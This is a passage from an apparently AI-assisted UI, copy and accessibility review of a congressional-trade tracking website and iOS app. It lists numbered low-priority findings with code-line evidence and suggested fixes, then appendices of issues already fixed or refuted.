- **Evidence:** origin/main dashboardHtml.ts:1593 `.pill-select.pill-cal::before { content:"📅"; }`; :2736/:2872 `<span class="ios-filter-ico" aria-hidden="true">🏛</span>`; :10864 `'🔗 ' + esc(label)`; :11458/:11467 `🔗 View source filing`; :10890 `PERF_GATE = '<div class="tier-gate-note">📈 Price &amp; performance…'`; :10411 `'⚡ Ahead of …'`.  desktop/trades.png toolbar crop shows the Apple calendar emoji with its fixed date glyph.  iOS chips use `calendar`, `building.columns`, `person.2` SF Symbols.
- **Panel:** visual-design — All lines quoted.  status_vs_prior changed to `new`: the 2026-08-10 review's P3-1 concerned party-animal emoji (since replaced by dots), not these UI icons. · `visual-design/VISUALDESIGN-12`

#### 281. [P3] Legal pages use a text wordmark ('Congress.Trade' with blue dot) instead of the eagle lockup used everywhere else

- **Where:** /terms-of-service, /privacy-policy header  ·  **Surface:** Web  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** #2013 fixed the theme mismatch but the legal-page brand is still a plain bold system-font string with an accent dot — a third logo treatment.
- **Impact:** Brand inconsistency on pages linked from the App Store and every footer.
- **Fix:** Reuse the eagle PNG/SVG (`brand-logo-light/dark`) at 40px with theme swap; drop `.brand .dot`.
- **Evidence:** origin/main app/src/ui/legalHtml.ts:166 `<header><a class="brand" href="/">Congress<span class="dot">.</span>Trade</a>${legalThemeSegHtml()}</header>`; :143 `.brand{font-weight:700;font-size:16px;font-family:var(--sans)}.brand .dot{color:var(--accent)}` with :130 `--sans:system-ui,…`.  Dashboard header uses `<img class="brand-logo" src="/assets/brand-logo-light.png?v=20">` (dashboardHtml.ts:2693); iOS uses the eagle lockup image.
- **Panel:** visual-design — Lines quoted on origin/main. · `visual-design/VISUALDESIGN-18`

#### 282. [P3] Filter-chip row mixes two chip styles: white outlined time select vs tinted icon chips, different font sizes and carets

- **Where:** Trends and Trades shared filter row  ·  **Surface:** Web  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Two components with different backgrounds, type sizes and caret glyphs sit in one control row.
- **Impact:** Row looks assembled from parts; the first chip reads as a different control type.
- **Fix:** Give `.pill-select-el` `background:var(--panel-2)`, `font-size:13px` and the same caret; or rebuild the time chip as an `.ios-filter` menu like the other three.
- **Evidence:** desktop/trades.png toolbar crop: 'Past 3 Months' chip is white with a grey SVG chevron; the next three chips are blue-tinted with a CSS-triangle caret.  origin/main dashboardHtml.ts:1596-1600 `.pill-select-el { … background:var(--panel); … font:600 12px var(--sans); … background-image:url('data:image/svg+xml… M7 10l5 5 5-5z') }` vs :1473-1484 `.ios-filter-btn { … background: var(--panel-2); … font-size: 13px; font-weight: 600 } .ios-filter-btn::after { … border-top: 4px solid currentColor; opacity:.55 }`.
- **Panel:** visual-design — CSS quoted; visible in the toolbar crop. · `visual-design/VISUALDESIGN-19`

#### 283. [P3] Ticker drawer Activity block: five tiles in a two-column grid leaves 'Buy Pressure' orphaned; header/hero company casing disagree

- **Where:** Company drawer (?ticker=NVDA)  ·  **Surface:** Web · desktop  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-08-18 (capture NOTES.md h.8)
- **What:** Odd tile count in an even grid, and two normalisations of the same company name in one header.
- **Impact:** Visible unevenness at the top of every company drawer.
- **Fix:** Use a 3+2 or single-row 5-up grid at drawer width (or fold Buy Pressure into Net Flow), and run the topbar through `fmtCompany`.
- **Evidence:** desktop/ticker.png: 2×2 tiles + lone 'Buy Pressure 29% buys' tile; topbar 'NVDA | Nvidia Corporation' vs hero 'NVIDIA Corporation'.  origin/main dashboardHtml.ts:11157-11158 renders 5 `kpi()`/`kpiInfo()` tiles; :11149 `topbarTitle = esc(d.ticker) + … esc(companyName)` (raw) while :11038 `var label = fmtCompany(name || ticker || 'Company')`.  NOTES.md (h)8.
- **Panel:** visual-design — Code lines quoted on origin/main; screenshot as described. · `visual-design/VISUALDESIGN-23`

#### 284. [P3] 'Government / Municipal Debt' label wraps to two lines against a 180px label cap that the comment claims 'clears the longest real label'

- **Where:** Trends → By Asset Type  ·  **Surface:** Web · desktop  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The label cap was sized for sector names, but the same layout is reused for asset-type names which are longer.
- **Impact:** One misaligned row in an otherwise regular list.
- **Fix:** Shorten to 'Gov / Municipal Debt' in the asset-type map, or raise the cap to 210px for that panel.
- **Evidence:** desktop/trends-a11y.txt:434 StaticText 'Government / Municipal Debt'; trends-full.png shows it wrapping to two lines with the value beside line 1.  origin/main dashboardHtml.ts:1067-1073 comment '180px clears the longest real label ("Communication Services", 156px)' and `.flowrow .ftop { grid-template-columns: min(58%, 180px) 1fr; }`.
- **Panel:** visual-design — Comment and grid rule quoted on origin/main; label present in the a11y tree. · `visual-design/VISUALDESIGN-25`

#### 285. [P3] Columns modal: 'Reset' floats mid-right beside the checkbox list; native checkboxes

- **Where:** Trades → ⋯ → Columns  ·  **Surface:** Web · desktop  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Reset is neither in the header nor a footer action row; it looks accidentally positioned.
- **Impact:** Minor but visible on a power-user control.
- **Fix:** Move Reset into `.panel-head` next to Close (or a footer row), set `accent-color: var(--accent)` on the checkboxes, and cap the dialog width to the list.
- **Evidence:** desktop/trades-columns-menu.png: Reset button vertically centred beside the 13-row list.  origin/main dashboardHtml.ts:2784-2786 `<div id="colChooserBody" class="colopts"></div><button class="btn ghost sm" onclick="resetCols()">Reset</button></dialog>`; :1197 `.colopts { display:flex; flex-direction:column; … flex:1 }` — Reset is a flex sibling of the list; no `accent-color` rule in the file.
- **Panel:** visual-design — Screenshot and markup confirmed; softened 'unstyled' to 'native' since macOS Chrome already renders them blue. · `visual-design/VISUALDESIGN-27`

#### 286. [P3] Focus ring appears on the drawer Close button when a drawer opens by pointer or URL

- **Where:** Trade/ticker drawers  ·  **Surface:** Web · desktop  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Programmatic focus lands on the close control, so pointer users see an unexplained highlighted X.
- **Impact:** Polish; slightly confusing affordance.
- **Fix:** Focus the drawer panel/heading (`tabindex="-1"`) instead of Close, and add `.drawer-close:focus:not(:focus-visible){outline:none}` while keeping a strong `:focus-visible` ring.
- **Evidence:** desktop/trades-row-expanded.png and desktop/ticker.png: 48px Close circle with a 2px blue outline immediately after opening; desktop/politician-detail.png shows it without the ring.  origin/main dashboardHtml.ts:10788-10792 `function trapFocusIn(container) { … var els = focusableEls(container); if (els.length) els[0].focus(); …}` called at :10854; the first focusable is `.drawer-close` (:3423 markup, :1115 CSS); no `.drawer-close:focus:not(:focus-visible)` rule exists (grep).
- **Panel:** visual-design — Code confirmed; ring visible in trades-row-expanded.png. · `visual-design/VISUALDESIGN-28`

#### 287. [P3] iOS Trade Details 'Performance vs S&P 500' placeholder card is narrower than sibling cards because DetailSection has no maxWidth

- **Where:** Trade Details sheet  ·  **Surface:** iOS  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** One card in the stack has a different width, so the column edge zig-zags.
- **Impact:** Visible misalignment on the most-opened sheet.
- **Fix:** Add `.frame(maxWidth: .infinity, alignment: .leading)` inside `DetailSection` (before `.padding(16)`), so every card fills the column regardless of content; screenshot-verify light+dark.
- **Evidence:** ios/light/13-trade-detail-expanded.png: Trade Summary and Timeline cards span the full width while the Performance card is inset ~25pt each side.  origin/main TradeDetailView.swift:72-74 `if hasResolvedTicker { performanceSection }`; :290 `DetailSection("Performance vs S&P 500") { … } else { Text("Price & performance … will appear when market data is available…") }` — the placeholder branch has no `.frame(maxWidth: .infinity)`; Components.swift:382-405 `struct DetailSection` builds `VStack … .padding(16).background(…)` with no `.frame(maxWidth: .infinity, alignment: .leading)`, so a section whose content is only wrapped text sizes to that text, while sections of `DetailRow`s fill the width.
- **Panel:** visual-design — Screenshot reproduced; root cause identified in DetailSection (no maxWidth) rather than an extra padding modifier as the raw finding guessed — recommendation updated; confidence raised to high. · merged: ios-shipped-app/IOSSHIPPEDAPP-42, ios-hig-ux/IOSHIGUX-18 · `visual-design/VISUALDESIGN-29`

#### 354. [P3] JS-set strings with two ASCII spaces collapse to one on screen (textContent/toast)

- **Where:** Login message, billing toasts, sign-in outcome toasts  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** The two-space rule is met in source but not in the rendered UI for these strings.
- **Impact:** Owner rule silently not honored on the sign-in/billing messages.
- **Fix:** Use `\u00a0 ` in these literals (or a shared SENTENCE_GAP constant as ST does).
- **Evidence:** origin/main dashboardHtml.ts:11722 `msg.textContent = 'Sign In with Apple is not configured for this site yet.  Use Google.'`, :11862, :11877, :11996-11997, :12555, :12561 use plain `"  "`; `.toast` rule at :1371 and `<p class="note" id="loginMsg">` (:3442) have no `white-space: pre*` (grep of `white-space` in the file shows only nowrap/normal), so HTML whitespace collapsing renders a single space.  Correct pattern used elsewhere: :9838 `\u00a0 `, pricingCopy :11750 literal NBSP.
- **Panel:** ux-copy — Source and CSS confirmed (no white-space:pre on .toast or #loginMsg); rendering collapse follows from standard HTML whitespace handling — not screenshot-verified because those states need sign-in. · `ux-copy/UXCOPY-33`

#### 355. [P3] Three inline-separator conventions in play (wide NBSP bullets, middle-dot ' · ', pipe ' | ') across adjacent web surfaces

- **Where:** Trends stat rows vs name meta lines vs Trades table vs ticker drawer subtitle vs footer  ·  **Surface:** Web  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Stat lines follow the owner's wide-bullet rule in Trends but the Trades table, ticker/company drawer subtitle and market-cap row use pipes, and name/meta lines and the footer use tight middle dots.
- **Impact:** Visual rhythm differs card to card; the pipe reads as a CLI idiom.
- **Fix:** One `sep()` helper emitting the NBSP-padded bullet for stat lists and ` · ` only for tight identity meta; replace the pipes at :4325/:11154/:11022 (keep the ticker|name title pipe only if still wanted).
- **Evidence:** Wide bullets (`'\u00a0\u00a0•\u00a0\u00a0'`): dashboardHtml.ts:10435/10441/10512/10657/10684, Directory count :9818.  Middle dots: 36 occurrences of `' · '` incl. footer :3410 `Congress.Trade · educational tool … · not financial advice`, Most Active meta ('Ro Khanna · House · CA').  Pipes: :4325 `'<span class="muted">  |  ' + esc(r.st)` → 'Kevin Hern | OK' (desktop/trades.png); :11154 `' trades  |  ' … ' politicians  |  ' … ' approx. volume  |  '` (desktop/ticker.png); :11022 `'  |  ' + estUsd(ref.marketCap)`; :11149 topbar `'  |  '` — these ASCII double spaces collapse in HTML so they render narrow.  CONTEXT.md: wide `  •  ` / `  /  ` between inline stats.
- **Panel:** visual-design — Corrected the evidence: wide bullets are written as `\u00a0\u00a0•\u00a0\u00a0` (not literal spaces) and ` · ` occurs 36 times, not 68; pipes confirmed at the cited lines. · `visual-design/VISUALDESIGN-20`

#### 356. [P3] Trade drawer repeats the same targets three ways (identity cards, 'Politician Details'/'Company Details' buttons, 'Name ›' row) and states the amount twice

- **Where:** Trade drawer header (openTrade)  ·  **Surface:** Web  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Punch-list accretions left three affordances for one action and the bracket amount in both the sticky topbar and the hero.
- **Impact:** Header takes ~40% of the drawer before any new information; hierarchy suffers, especially on mobile sheets.
- **Fix:** Keep the identity cards as the only entity links, drop the two ghost buttons, and make the topbar breadcrumb ticker-only so the amount appears once.
- **Evidence:** desktop/trades-row-expanded.png: topbar 'SOLD $1k - $15k of VSNT', then SOLD kicker + '$1k – $15k' headline, two clickable cards, buttons 'Politician Details' / 'Company Details', then 'NAME Kevin Hern ›'.  origin/main dashboardHtml.ts:11354-11360 personCard/assetCard (`clickable`, `title="Open politician"`), :11368-11376 entityActions buttons, :11391-11393 `kvRow('Name', memberVal + nameChevron)`.
- **Panel:** visual-design — Screenshot and code confirmed; whether the redundancy is intentional (owner punch-list) is unknown, so confidence stays medium. · merged: web-ux-desktop/WEBUXDESKTOP-22 · `visual-design/VISUALDESIGN-21`

#### 357. [P3] Net Flow by Sector / By Market Cap bars are linearly scaled to a single outlier, so most bars are ~0 px

- **Where:** Trends → Net Flow by Sector, By Market Cap, By Party, By Asset Type  ·  **Surface:** Web  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** With bracket-midpoint dollar volumes spanning orders of magnitude, a linear fill carries little information beyond 'one bucket is big'.
- **Impact:** A prominent Trends module that looks empty to a first-time visitor.
- **Fix:** Scale by rank or sqrt (documented in the ⓘ tip), or split the outlier into a callout; alternatively a two-tone buy/sell split bar so every row has visible ink.
- **Evidence:** desktop/trends-full.png (y 1500-2900): By Market Cap — Large Cap fills the track, Micro/Small render as tiny stubs; Net Flow by Sector — Technology ~$5.0m at ~half track, Financial Services ~$2.7m shorter, tail rows a few px.  origin/main dashboardHtml.ts:1071-1076 `.flowrow` draws one track per row scaled to the max value.
- **Panel:** visual-design — Reproduced for By Market Cap in the crop; the specific Energy $16.4m figure was not in my crop but the sector rows show the same pattern. · `visual-design/VISUALDESIGN-24`

#### 358. [P3] Mobile web trade card: amount meter floats offset above the amount and company name truncates to ~10 characters

- **Where:** Trades cards (mobile)  ·  **Surface:** Web · mobile  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** The two-row card compresses ticker + company + pill + amount + meter into row 1, so the meter overlaps the row's top padding and the name gets almost no room.
- **Impact:** Cards read as slightly misaligned; company names are rarely legible.
- **Fix:** Stack the meter under the amount (or drop it on cards) and give the company name `flex:1; min-width:0` with the pill moved to row 2 next to JOINT.
- **Evidence:** mobile/trades.png (crop y 300-900): half-height signal bars sit right-aligned above and to the right of '$1k – $15k'; company reads 'Versant Me…' / 'Mondelez I…' while the meta line below has spare width.  origin/main dashboardHtml.ts:559 comment 'Half-height bars here only'.
- **Panel:** visual-design — Reproduced in the mobile crop (also visible in dark/dm-trades.png). · `visual-design/VISUALDESIGN-34`

#### 377. [P3] Light/dark surface hierarchy is inverted between web and iOS (web: tinted page + white cards, navy dark; iOS: white page + grey cards, black dark)

- **Where:** Global theme tokens  ·  **Surface:** Cross-surface  ·  **Category:** design  ·  **Effort:** M  ·  **Verdict:** plausible (medium confidence)
- **What:** Web cards are lighter than the page; iOS cards are darker than the page.  Web dark is navy, iOS dark is neutral black.
- **Impact:** Side by side the products do not look related; dark-mode brand colour is lost on iOS.
- **Fix:** Publish the web tokens as an iOS `AppTheme` palette (bg #eff3f8 / panel white / dark bg #080c17 / panel #121b30) with dynamic UIColor, or vice-versa; keep semantic buy/sell/party tokens identical.
- **Evidence:** Web dashboardHtml.ts:192-198 light `--bg:#eff3f8; --panel:#ffffff; --panel-2:#e8eff8` and :152-156 dark `--bg:#080c17; --panel:#121b30`.  iOS Components.swift:78-80 `background = .systemBackground` (white / black), `panel = .systemGray6.opacity(0.4)`; ios/light/20-trends-top-loaded.png grey cards on white; ios/dark/04-trends-dark.png near-black with grey cards.
- **Panel:** visual-design — Token values confirmed on both platforms; whether the inversion is a defect vs a platform-idiomatic choice is a judgement call — kept P3. · `visual-design/VISUALDESIGN-16`

#### 408. [P4] Toast/notice copy quirks: lowercase "premium", "🎉 You're in!", engineering phrasing "Retry will safely reuse this request"

- **Where:** Web checkout success toast; iOS delivery/watchlist notices  ·  **Surface:** Cross-surface  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Idempotency reassurance is engineering-speak; "premium" casing drift.
- **Impact:** Polish.
- **Fix:** "Welcome to Premium — your 2-week trial has started."; "Couldn't save.  Tap Retry to try again."
- **Evidence:** origin/main dashboardHtml.ts:11998 `showToast('🎉 You’re in! Your premium trial is active.')` (Premium is a proper noun everywhere else); iOS CongressTradeStore.swift:1022/:1079/:1113 `"Could not save. Retry will safely reuse this request: \(error.localizedDescription)"` etc.
- **Panel:** ux-copy — Strings confirmed at the cited lines. · `ux-copy/UXCOPY-29`

#### 409. [P4] Web Delivery form placeholders are lowercase fragments and use "CSV" to mean comma-separated next to a Premium "CSV export" feature

- **Where:** Delivery create form  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Placeholder casing/style differs from every other label on the page and "CSV" is overloaded.
- **Impact:** Polish.
- **Fix:** "Webhook URL (https://…)", "Tickers, comma-separated (optional)", "Politicians by name or id (optional)".
- **Evidence:** origin/main dashboardHtml.ts:3167 `placeholder="target URL (webhook only)"`, :3168 `placeholder="tickers (CSV, optional)"`, :3169 `placeholder="members (names/ids, optional)"`; iOS DeliveryView.swift:135 `"Members (comma separated, optional)"`.
- **Panel:** ux-copy — Confirmed; lines corrected to 3167-3169. · `ux-copy/UXCOPY-35`

#### 410. [P4] Directory subtitle for Assets says "Every ticker Congress has disclosed a trade in" (corpus includes Executive filers)

- **Where:** Directory → Assets subtitle  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Corpus-accuracy rule (docs/FLEET-UI-COPY.md:84-90: House, Senate, Executive Branch).
- **Impact:** Minor inaccuracy.
- **Fix:** "Every ticker a tracked filer has disclosed a trade in."
- **Evidence:** origin/main dashboardHtml.ts:9839 `var DIR_SUB_ASSETS = 'Every ticker Congress has disclosed a trade in.\u00a0 …'` while :9838 People copy correctly says `members of Congress and executive filers`.
- **Panel:** ux-copy — String confirmed at 9839. · `ux-copy/UXCOPY-36`

#### 411. [P4] iOS Politician sheet shows "N/A" for missing metrics while the rest of the app uses "—"

- **Where:** Politician → Performance vs S&P 500 tiles  ·  **Surface:** iOS  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Two different empty-value tokens in one app.
- **Impact:** Polish.
- **Fix:** Use "—" everywhere.
- **Evidence:** origin/main PoliticianDetailView.swift:77-79 and :172-180 `… : "N/A"`; CompactFormat.usd/count return `"—"` for nil (Components.swift:298, :327); Trends KPI tiles show `—` (ios/light/03-trends-request-failed-state.png).
- **Panel:** ux-copy — Confirmed at the cited lines. · `ux-copy/UXCOPY-37`

#### 412. [P4] iOS Ticker sheet Net Flow tile is unsigned (no leading +) unlike Trends Net Flow and the owner's "net +$" convention

- **Where:** Ticker → Trading Summary  ·  **Surface:** iOS  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Positive net flow renders as "$1.2m" here but "+$1.2m" on Trends.
- **Impact:** Sign convention drift.
- **Fix:** Use SignedFlowFormat here too.
- **Evidence:** origin/main TickerDetailView.swift:95 `MetricTile(title: "Net Flow", value: CompactFormat.usd(summary.estimatedNetFlowUsd))` vs TrendsView.swift:199 `value: SignedFlowFormat.usd(s?.estimatedNetFlowUsd)`; CompactFormat.usd emits `-` only (Components.swift:300 `let sign = value < 0 ? "-" : ""`).
- **Panel:** ux-copy — Confirmed at the cited lines. · `ux-copy/UXCOPY-38`

#### 413. [P4] Web "Sign in with Google to …" gates name only Google although Apple sign-in is offered

- **Where:** Delivery gate notices  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Provider-specific instruction contradicts the sign-in modal.
- **Impact:** Minor confusion for Apple users.
- **Fix:** "Sign in to use Delivery."
- **Evidence:** origin/main dashboardHtml.ts:3155 `Sign in with Google to manage Delivery.…`, :6714 `'Sign in with Google to use Delivery.&nbsp; …'` (desktop/delivery.png); Sign In modal offers Apple too (:3440).
- **Panel:** ux-copy — Strings confirmed at 3155/6714 and Apple button at 3440. · merged: qa-bughunt/QABUGHUNT-29, web-mobile/WEBMOBILE-30 · `ux-copy/UXCOPY-41`

#### 414. [P4] Buys vs Sells weekly chart uses ≤9px bars across a 1370px card — mostly whitespace

- **Where:** Trends → Buys vs Sells  ·  **Surface:** Web · desktop  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The bar cap suits the narrow drawer chart but starves the full-width Trends chart.
- **Impact:** Chart reads as sparse compared with surrounding cards.
- **Fix:** Let the cap scale with column width (e.g. `max-width: clamp(6px, 40%, 24px)`) or set a larger cap for `#trTime` only.
- **Evidence:** desktop/trends-full.png (y≈1560-1690): 12 weekly column pairs ~8px wide with ~100px gaps.  origin/main dashboardHtml.ts:957 `.tbars i { … max-width:9px; … }`; :2036 (inside the ≤768px media block at :1821) `#view-trends .tbars i { max-width: 5px; }`.
- **Panel:** visual-design — Reproduced in the crop; CSS quoted. · `visual-design/VISUALDESIGN-26`

#### 442. [P4] "STOCK Act", "PTR", "P90", "HMAC-SHA256", "EventSource" never explained on first use for consumers

- **Where:** Footer, Trends Disclosure Timeliness, Delivery, drawers  ·  **Surface:** Cross-surface  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)
- **What:** Consumer-facing surfaces assume knowledge of the STOCK Act (Stop Trading on Congressional Knowledge Act of 2012), the 45-day rule, and percentile/crypto jargon.
- **Impact:** Onboarding friction for non-finance visitors; the site's civic value proposition depends on this context.
- **Fix:** Add one tooltip/footnote: "STOCK Act (2012): the law requiring members of Congress and senior officials to disclose trades within 45 days."; keep HMAC/EventSource inside the developer-facing card only.
- **Evidence:** Web dashboardHtml.ts:3024 `The STOCK Act sets a 45-day deadline` (no expansion anywhere on the page; footer :3410 `STOCK Act (2012)`); :3149 `Every request is HMAC-SHA256 signed`; :3145 `Live Stream (SSE)`; iOS TrendsView.swift:735 `"P90 Delay"` (footnote :560 explains only if scrolled).  Web tooltips explain Net Flow/Buy Pressure/Approx. Volume well (:9286-9289) but there is no ⓘ on the STOCK Act mention or the 45-day rule.
- **Panel:** ux-copy — Cited strings exist; absence of an expansion is a reasoned negative (grep for 'Stop Trading' would settle it) — kept as a P4 idea. · `ux-copy/UXCOPY-26`

#### 443. [P4] Web sign-in modal subtitle promises "Premium research tools" that don't exist as such

- **Where:** Sign In modal  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)
- **What:** "Research tools" is vaguer and grander than the actual paid features.
- **Impact:** Minor expectation mismatch.
- **Fix:** "Sign in to manage your account, export CSV, and set up Delivery."
- **Evidence:** origin/main dashboardHtml.ts:3431 `<p class="sub">Sign in to manage your account and use Premium research tools.</p>` vs Premium features listed at :11747-11772 (CSV export, webhooks, SSE).
- **Panel:** ux-copy — String confirmed; whether 'research tools' misleads is a judgment call — kept P4. · `ux-copy/UXCOPY-28`

#### 444. [P4] iOS Trade Details offers both "Filing PDF" and "Source Filing" with no explanation of the difference; timeline label "Discovered" differs from web "Seen"

- **Where:** Trade Details bottom buttons and Timeline  ·  **Surface:** iOS  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Two adjacent CTAs whose targets differ (our Premium PDF proxy vs. the free government portal) are indistinguishable by label; timeline vocabulary differs from web.
- **Impact:** Users click twice to learn the difference; parity drift.
- **Fix:** "Open Filing PDF (Premium)" + "View on House/Senate site"; use "Seen" (or change web to "Discovered") consistently.
- **Evidence:** origin/main TradeDetailView.swift:259 `Label("Filing PDF"…)` (Premium proxy, see UXCOPY-08), :274 `Label("Source Filing"…)` (government portal) — both in ios/light/14-trade-detail-scrolled.png; :82 `DetailRow("Discovered", …)`; web drawer uses `SEEN`, `OFFICIAL FILED`, `IMPORTED`, `🔗 View source filing` (trades-row-expanded-a11y.txt:145-157; column tip dashboardHtml.ts:4494).
- **Panel:** ux-copy — Both buttons and 'Discovered' visible in the screenshot; web 'Seen' confirmed. · `ux-copy/UXCOPY-34`

#### 445. [P4] iOS Directory empty-state hint "(full or CA)" is cryptic

- **Where:** Directory no-results state  ·  **Surface:** iOS  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)
- **What:** "full or CA" is meant as "full name or two-letter code" but reads oddly.
- **Impact:** Polish.
- **Fix:** "Try a name, a state (California or CA), a party, or a combination like “CA Ro”."
- **Evidence:** origin/main PeopleDirectoryView.swift:135 `"Try a name, state (full or CA), party, or “CA Ro”."`
- **Panel:** ux-copy — String confirmed; readability is a judgment call. · `ux-copy/UXCOPY-40`

#### 446. [P4] Web Delivery create form: mismatched control widths and lowercase placeholders

- **Where:** Delivery → create delivery form  ·  **Surface:** Web · desktop  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Field sizes are not proportional to content and placeholder casing differs from every other input on the site.
- **Impact:** Cosmetic; the form is the paid feature's front door.
- **Fix:** Grid the form (channel + target on one row, tickers/members half-width each, filters row), sentence-case placeholders, and show a real disabled state for anonymous visitors.
- **Evidence:** desktop/delivery-full.png: 100px 'SSE' select alone on a line, then two full-width inputs, then a row of two selects + label + button.  origin/main dashboardHtml.ts:3168-3169 `<input id="newTickers" placeholder="tickers (CSV, optional)" style="flex:1 1 100%;min-width:0" disabled />` `<input id="newMembers" placeholder="members (names/ids, optional)" …>`.
- **Panel:** visual-design — Placeholders quoted on origin/main.  Cross-lens overlap: UXCOPY-35 (copy angle). · `visual-design/VISUALDESIGN-36`

#### 466. [P4] Amount bracket meter resembles a phone signal-strength icon

- **Where:** Trades table Amount column and cards  ·  **Surface:** Web  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** plausible (low confidence)
- **What:** The metaphor is ambiguous without the tooltip; a horizontal bracket scale would be self-explanatory.
- **Impact:** Idea-level; some users will not decode it.
- **Fix:** Consider a short horizontal 6-step track (like the Lag Distribution bars) or a tier label beside the range; keep monospace amount text.
- **Evidence:** desktop/trades.png Amount column: six ascending grey bars with the first two blue, reading as cellular signal.  origin/main dashboardHtml.ts:4371 '// Six visual bars so the $0–$1k product tier gets its own first step.'
- **Panel:** visual-design — Visual reproduced; the 'reads as signal icon' claim is an opinion — P4 idea, kept. · `visual-design/VISUALDESIGN-35`


## Appendix C — already fixed on main since the snapshot (5)

- **P0** iOS member(id:) percent-encodes the query string → every politician detail 404s — iOS member(id:) now builds a URLComponents on endpointURL("member").appendingPathComponent(id) and puts sort/order/etc. as queryItems instead of appending an encoded query string to the path; a code comment says this exact bug was fixed.  Landed in PR #1894 ([GROK] fix first-tap member 404) and confirmed live: GET /api/client/v1/member/C001047?sort=tx_date&order=desc now returns 200.
- **P2** In-app links to web Stripe purchase: Delivery 'Or subscribe on Congress.Trade', empty-catalog fallback, and the paywall's own 'Pricing' footer link (which points at the site root / web modal) — PR #1984 (8f91ee0f, 'fix(ios): remove web Stripe checkout from native Premium surfaces') removed APIClient.upgradeURL entirely, removed the DeliveryView 'Or subscribe on Congress.Trade' Safari link, removed the PremiumSheet empty-catalog 'Open Congress.Trade pricing' link, and made LegalFooterLinks/AppLegal route the Pricing footer item through openPremium() (StoreKit) instead of Safari — all three cited in-app web-checkout links are gone.
- **P3** iOS upgrade link points at the site root, not /pricing — PR #1984 (fix(ios): remove web Stripe checkout from native Premium surfaces, App Review 3.1.1) deleted the native 'Open Congress.Trade pricing' / 'Or subscribe on Congress.Trade' web-checkout links entirely from PremiumSheet and DeliveryView -- there is no longer any hardcoded congress.trade site-root URL in either file (grep for the site domain in Views/Status/PremiumSheet.swift and Views/Delivery/DeliveryView.swift returns nothing), so the misdirected-link defect no longer exists.
- **P3** Sticky Trends filter bar is 362px wide on a 390px viewport — 28px seam at the right where content scrolls under it — The mobile filter chrome rebuild (#1897/#2017) made #tradesToolbars/#trendsSharedFilters full-bleed sticky bars with no fixed pixel width; live-tested at 390px and 375px, the sticky filter row now sits flush to both edges with no visible seam.
- **P3** First page of /api/transactions is fetched twice at boot (first request aborted) and the Trades table is rendered twice — Live network trace on 2026-08-19 shows exactly one GET /api/transactions request at boot (no aborted duplicate), and the boot code now has a single loadTrades().then(...) call (dashboardHtml.ts:12814) with no redundant fetchPage() call elsewhere in the init path.

## Appendix A — refuted by verification (3)

- `engineering-quality/ENGINEERINGQUALITY-20` Web/iOS API contract has no machine-checked schema: /api/client/v1 absent from openapi.yaml, prose-only client-mobile-api.md, no shared fixtures — The finding's headline claim -- that /api/client/v1 is entirely absent from openapi.yaml, documented at only 56 total paths with client/v1 covered by nothing but a stray description line -- is factually wrong. openapi.yaml genuinely documents 10 of the 11 real /api/client/v1 routes (only GET /documents/:docId/pdf is missing), added months before this review's date.  This is a clean refutation of the load-bearing evidence, not a nitpick: a reader acting on this finding would waste effort 'adding' schema that already exists.  The narrower, still-true observations buried in the finding -- some routes (health sub-paths, assets, feed.xml, photos/member, and the one client/v1 pdf route) are undocumented, and there is no CI lint step or shared-fixture mechanism enforcing the doc stays in sync -- are real but were not the finding's central claim as written, and P3-level 'partial doc gaps + no lint step' is a materially smaller problem than 'the mobile contract is undocumented.'  Recommend dropping this finding as stated; if the owner wants the surviving narrower point tracked, it should be re-raised as its own finding with corrected evidence, not salvaged here.
- `security-web/SECURITYWEB-17` Report-only CSP (connect-src 'none') seen in the capture console is not served by the edge or app — likely a capture-harness artifact — Could not reproduce with browser-shaped requests at the edge; the raw finding itself listed 'a browser extension in the capture profile' as a candidate.  Treat as capture artifact unless seen in a clean browser.
- `ux-copy/UXCOPY-08` iOS Premium sheet bullet "Open the original filing PDF from Congress" — feature is actually Premium-gated server-side; residual is an ungated-looking iOS button, cross-platform feature-list drift, and "from Congress" corpus wording — Refuted as stated: serveDocumentPdf is Premium-gated (rest.ts:1410-1414 redirects non-Premium to /pricing?feature=pdf), so the bullet is not a free feature.  Kept only as a P4 polish/parity note.

## Appendix B — method and coverage

